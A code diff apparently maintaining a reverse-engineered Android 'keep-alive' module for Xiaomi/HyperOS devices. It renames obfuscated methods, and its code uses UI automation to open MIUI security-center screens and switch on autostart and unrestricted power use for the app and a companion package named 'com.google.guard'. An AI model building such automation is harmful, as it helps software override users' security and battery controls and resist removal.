@@ -69,7 +69,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
     public final AtomicBoolean y;
 
     public XiaomiEngine() {
-        super(l0(), "com.miui.securitycenter");
+        super(buildAllListenWindows(), "com.miui.securitycenter");
         new AtomicBoolean(false);
         new AtomicBoolean(false);
         this.y = new AtomicBoolean(false);
@@ -82,7 +82,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
     // ======= Static CombineFilter builders =======
 
-    public static CombineFilter b0() {
+    /** vendor b0() → buildPowerConsumeFilter() */
+    public static CombineFilter buildPowerConsumeFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -91,7 +92,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return f;
     }
 
-    public static CombineFilter d0() {
+    /** vendor d0() → buildPowerSavingStrategyFilter() */
+    public static CombineFilter buildPowerSavingStrategyFilter() {
         CombineFilter f = new CombineFilter();
         StringCondition sc = FilterHelper.addCondition(f,
                 FilterHelper.initFilter(f, "className", "android.widget.TextView"), "text");
@@ -102,17 +104,19 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
     // ======= Static ListenWindow builders =======
 
-    public static ListenWindow e0() {
+    /** vendor e0() → buildAutoStartListenWindow() */
+    public static ListenWindow buildAutoStartListenWindow() {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                 "com.miui.permcenter.autostart.AutoStartManagementActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static LinkedList l0() {
+    /** vendor l0() → buildAllListenWindows() */
+    public static LinkedList buildAllListenWindows() {
         LinkedList list = new LinkedList();
         list.add(buildBatteryDialogListenWindow());
-        list.add(e0());
+        list.add(buildAutoStartListenWindow());
 
         ListenWindow lw3 = new ListenWindow("com.miui.powerkeeper",
                 "com.miui.powerkeeper.ui.HiddenAppsContainerManagementActivity");
@@ -120,14 +124,14 @@ public final class XiaomiEngine extends KeepAliveEngine {
         lw3.getEventTypes().add(16384);
         list.add(lw3);
 
-        list.add(n0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(n0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(o0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(o0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(m0(com.guard.wallet.utils.SystemHelper.x0()));
-        list.add(m0(com.guard.wallet.utils.SystemHelper.e()));
-        list.add(q0());
-        list.add(p0());
+        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildAppDetailListenWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildAppManagerListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildAppManagerListenWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.x0()));
+        list.add(buildFrameLayoutListenWindow(com.guard.wallet.utils.SystemHelper.e()));
+        list.add(buildHiddenAppsConfigListenWindow());
+        list.add(buildPowerDetailListenWindow());
 
         Integer evt32 = 32;
         Integer evt16384 = 16384;
@@ -170,7 +174,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return list;
     }
 
-    public static ListenWindow m0(String appName) {
+    /** vendor m0(String) → buildFrameLayoutListenWindow(String) */
+    public static ListenWindow buildFrameLayoutListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter", "android.widget.FrameLayout");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         lw.setMatchs(new LinkedList<>());
@@ -178,7 +183,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow n0(String appName) {
+    /** vendor n0(String) → buildAppDetailListenWindow(String) */
+    public static ListenWindow buildAppDetailListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                 "com.miui.appmanager.ApplicationsDetailsActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -187,7 +193,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow o0(String appName) {
+    /** vendor o0(String) → buildAppManagerListenWindow(String) */
+    public static ListenWindow buildAppManagerListenWindow(String appName) {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                 "com.miui.appmanager.AppManagerMainActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -196,14 +203,16 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return lw;
     }
 
-    public static ListenWindow p0() {
+    /** vendor p0() → buildPowerDetailListenWindow() */
+    public static ListenWindow buildPowerDetailListenWindow() {
         ListenWindow lw = new ListenWindow("com.miui.securitycenter",
                 "com.miui.powercenter.legacypowerrank.PowerDetailActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
         return lw;
     }
 
-    public static ListenWindow q0() {
+    /** vendor q0() → buildHiddenAppsConfigListenWindow() */
+    public static ListenWindow buildHiddenAppsConfigListenWindow() {
         ListenWindow lw = new ListenWindow("com.miui.powerkeeper",
                 "com.miui.powerkeeper.ui.HiddenAppsConfigActivity");
         FilterHelper.addEventType(32, FilterHelper.initEventTypes(lw), lw).add(16384);
@@ -226,10 +235,10 @@ public final class XiaomiEngine extends KeepAliveEngine {
                     }
                     AtomicReference ref = this.r;
                     if (Objects.equals(ref.get(), KEEP_ALIVE_MAIN)) {
-                        this.s0(MainApplication.getAppContext().getPackageName());
+                        this.savePowerControlState(MainApplication.getAppContext().getPackageName());
                     }
                     if (Objects.equals(ref.get(), KEEP_ALIVE_BACKUP)) {
-                        this.s0("com.google.guard");
+                        this.savePowerControlState("com.google.guard");
                     }
                     super.p.shutdownNow();
                     com.guard.wallet.thread.DelegateTaskLauncher.a(super.c);
@@ -249,7 +258,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final void c0() {
+    /** vendor c0() → navigateAndSetPowerStrategy() */
+    public final void navigateAndSetPowerStrategy() {
         try {
             com.guard.wallet.helper.BlockViewManager.h(10);
             UiObject scrollView = this.findScrollableContainer();
@@ -257,14 +267,14 @@ public final class XiaomiEngine extends KeepAliveEngine {
             if (scrollView != null) {
                 scrollView.scrollForwardEnd();
                 scrollView.refresh();
-                found = FilterHelper.scrollBackwardUtilFilter(scrollView, d0());
+                found = FilterHelper.scrollBackwardUtilFilter(scrollView, buildPowerSavingStrategyFilter());
                 if (found == null) {
-                    found = FilterHelper.scrollForwardUtilFilter(scrollView, b0());
+                    found = FilterHelper.scrollForwardUtilFilter(scrollView, buildPowerConsumeFilter());
                 }
             } else {
-                found = this.k().findOneByCombine(d0());
+                found = this.k().findOneByCombine(buildPowerSavingStrategyFilter());
                 if (found == null) {
-                    found = this.k().findOneByCombine(b0());
+                    found = this.k().findOneByCombine(buildPowerConsumeFilter());
                 }
             }
             String errMsg;
@@ -275,11 +285,11 @@ public final class XiaomiEngine extends KeepAliveEngine {
                 if (clickable != null && clickable.click()) {
                     Log.d("o.q", "已点击电量消耗、耗电策略栏目:" + clickable);
                     com.guard.wallet.helper.BlockViewManager.h(30);
-                    for (int i = 0; !this.g0() && i < 20; i++) {
+                    for (int i = 0; !this.isInPowerStrategyWindow() && i < 20; i++) {
                         Log.d("o.q", "正在查找电量消耗、耗电策略窗口");
                         com.guard.wallet.utils.SystemHelper.T0(2);
                     }
-                    this.k0();
+                    this.setUnrestrictedPowerStrategy();
                     return;
                 }
                 errMsg = "查找并点击耗电策略栏目失败";
@@ -292,15 +302,16 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final boolean f0() {
+    /** vendor f0() → isInAppDetailWindow() */
+    public final boolean isInAppDetailWindow() {
         try {
             String appLabel = Objects.equals(this.r.get(), KEEP_ALIVE_MAIN)
                     ? com.guard.wallet.utils.SystemHelper.x0()
                     : com.guard.wallet.utils.SystemHelper.e();
             LinkedList list = new LinkedList();
-            list.add(n0(appLabel));
-            list.add(o0(appLabel));
-            list.add(m0(appLabel));
+            list.add(buildAppDetailListenWindow(appLabel));
+            list.add(buildAppManagerListenWindow(appLabel));
+            list.add(buildFrameLayoutListenWindow(appLabel));
             if (this.q(list)) {
                 Log.d("o.q", "已进入App详情窗口");
                 return true;
@@ -312,11 +323,12 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final boolean g0() {
+    /** vendor g0() → isInPowerStrategyWindow() */
+    public final boolean isInPowerStrategyWindow() {
         try {
             LinkedList list = new LinkedList();
-            list.add(q0());
-            list.add(p0());
+            list.add(buildHiddenAppsConfigListenWindow());
+            list.add(buildPowerDetailListenWindow());
             if (this.q(list)) {
                 Log.d("o.q", "已进入App省电策略窗口");
                 return true;
@@ -327,9 +339,10 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean h0() {
+    /** vendor h0() → isInAutoStartWindow() */
+    public final boolean isInAutoStartWindow() {
         try {
-            if (this.q(Collections.singletonList(e0()))) {
+            if (this.q(Collections.singletonList(buildAutoStartListenWindow()))) {
                 Log.d("o.q", "已进入自启动管理窗口");
                 return true;
             }
@@ -339,11 +352,12 @@ public final class XiaomiEngine extends KeepAliveEngine {
         return false;
     }
 
-    public final boolean i0(String appLabel) {
+    /** vendor i0(String) → toggleAutoStart(String) */
+    public final boolean toggleAutoStart(String appLabel) {
         try {
             UiObject scrollView = this.findScrollableContainer();
             if (scrollView == null) {
-                this.r0();
+                this.scrollToRefreshView();
                 scrollView = this.findScrollableContainer();
             }
             UiObject found;
@@ -382,7 +396,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final void j0() {
+    /** vendor j0() → advanceStateMachine() */
+    public final void advanceStateMachine() {
         AtomicBoolean processingFlag = this.y;
         try {
             processingFlag.set(true);
@@ -399,7 +414,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                     Log.d("o.q", "启动MIUI自启动管理");
                     return;
                 }
-                this.s0(MainApplication.getAppContext().getPackageName());
+                this.savePowerControlState(MainApplication.getAppContext().getPackageName());
                 taskQueue.clear();
                 if (!com.guard.wallet.utils.SharedPrefsManager.r("com.google.guard")
                         && com.guard.wallet.utils.SystemHelper.d0("com.google.guard") != null) {
@@ -422,7 +437,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
                     Log.d("o.q", "启动MIUI自启动管理");
                     return;
                 }
-                this.s0("com.google.guard");
+                this.savePowerControlState("com.google.guard");
                 taskQueue.clear();
                 this.Z();
             }
@@ -431,10 +446,11 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final void k0() {
+    /** vendor k0() → setUnrestrictedPowerStrategy() */
+    public final void setUnrestrictedPowerStrategy() {
         try {
-            if (!this.g0()) {
-                if (this.g0()) {
+            if (!this.isInPowerStrategyWindow()) {
+                if (this.isInPowerStrategyWindow()) {
                     com.guard.wallet.utils.SystemHelper.F0(1);
                     com.guard.wallet.utils.SystemHelper.T0(10);
                 }
@@ -514,7 +530,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
             super.n.remove("startIgnoringBatteryOptimizations");
 
-            if (this.g0()) {
+            if (this.isInPowerStrategyWindow()) {
                 com.guard.wallet.utils.SystemHelper.F0(1);
                 com.guard.wallet.utils.SystemHelper.T0(10);
             }
@@ -523,7 +539,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final void r0() {
+    /** vendor r0() → scrollToRefreshView() */
+    public final void scrollToRefreshView() {
         try {
             ScreenMetricsVO metrics = com.guard.wallet.utils.DeviceUtils.buildScreenMetrics();
             Log.d("o.q", String.valueOf(metrics.getNavigationBarHeight()));
@@ -542,7 +559,8 @@ public final class XiaomiEngine extends KeepAliveEngine {
         }
     }
 
-    public final void s0(String packageName) {
+    /** vendor s0(String) → savePowerControlState(String) */
+    public final void savePowerControlState(String packageName) {
         try {
             String logMsg;
             if (Objects.equals(packageName, "com.google.guard")) {
@@ -594,7 +612,7 @@ public final class XiaomiEngine extends KeepAliveEngine {
             if (this.y.get()) {
                 return;
             }
-            boolean inAppDetail = this.f0();
+            boolean inAppDetail = this.isInAppDetailWindow();
             String threadId = super.c;
             ConcurrentLinkedQueue taskQueue = super.n;
 
@@ -611,8 +629,9 @@ public final class XiaomiEngine extends KeepAliveEngine {
 
             // ADAPT: HyperOS 3 的 openAppDetailSettings() 直接打开 PowerDetailActivity
             // (省电策略页)，跳过了 ApplicationsDetailsActivity (应用详情页)。
-            // 检测到已在省电策略窗口时，直接执行 k0() + j0()，跳过 c0() 的查找点击步骤。
-            else if (this.g0()) {
+            // 检测到已在省电策略窗口时，直接执行 setUnrestrictedPowerStrategy() + advanceStateMachine()，
+            // 跳过 navigateAndSetPowerStrategy() 的查找点击步骤。
+            else if (this.isInPowerStrategyWindow()) {
                 taskQueue.remove("keepAliveInAutoStartManage");
                 taskQueue.remove("keepAliveInAppPermissions");
                 taskQueue.remove("keepAliveInOtherPermissions");
@@ -623,9 +642,9 @@ public final class XiaomiEngine extends KeepAliveEngine {
                 }
             }
 
-            // ADAPT: HyperOS 3 packageName-only fallback 后 f0() 和 h0() 可能同时 true
-            // (同属 com.miui.securitycenter)。改为 else if 让 f0() 优先。
-            else if (this.h0()) {
+            // ADAPT: HyperOS 3 packageName-only fallback 后 isInAppDetailWindow() 和 isInAutoStartWindow() 可能同时 true
+            // (同属 com.miui.securitycenter)。改为 else if 让 isInAppDetailWindow() 优先。
+            else if (this.isInAutoStartWindow()) {
                 taskQueue.remove("keepAliveInAppDetail");
                 taskQueue.remove("keepAliveInAppPermissions");
                 taskQueue.remove("keepAliveInOtherPermissions");
